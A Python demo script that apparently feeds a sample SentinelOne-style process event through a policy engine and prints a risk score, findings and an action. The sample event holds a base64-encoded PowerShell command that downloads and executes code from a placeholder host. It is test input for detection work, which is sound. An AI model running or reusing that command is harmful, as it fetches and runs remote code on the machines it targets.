import json
from a2a.policy_engine.engine import PolicyEngine, load_policy
from a2a.policy_engine.mapper import load_mapping, map_event

def main():
    policy = load_policy("policies/base.yaml")
    engine = PolicyEngine(policy)

    mapping = load_mapping("mappings/sentinelone.yaml")

    # Example raw SentinelOne-ish event (you can replace with real telemetry)
    raw = {
        "timestamp": "2025-12-18T00:00:00Z",
        "event_type": "process",
        "AgentName": "laptop-01",
        "AgentOS": "Windows",
        "ProcessName": "powershell.exe",
        "ProcessCmd": "powershell -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHgAYQBtAHAAbABlAC4AdABvAHAAJwApAA==",
        "ProcessIntegrityLevel": "HIGH",
        "User": "SYSTEM",
        "DstPort": 443,
        "SrcIP": "10.0.0.5",
        "DstIP": "8.8.8.8",
        "NetworkUrl": "https://example.top/a",
        "direction": "outbound",
    }

    event = map_event(raw, mapping, event_type="process")
    result = engine.evaluate(event)

    # Print normalized event + decision
    print("NORMALIZED_EVENT:")
    print(json.dumps(event, indent=2))

    print("\nDECISION:")
    print(json.dumps(result, indent=2))

    # Your action-token output format
    print("\nACTION_OUTPUT:")
    print(f"RISK_SCORE: {result['risk_score']}")
    print(f"FINDINGS: {', '.join(result['findings']) if result['findings'] else 'none'}")
    print(f"ACTION : {result['action']}")

if __name__ == "__main__":
    main()
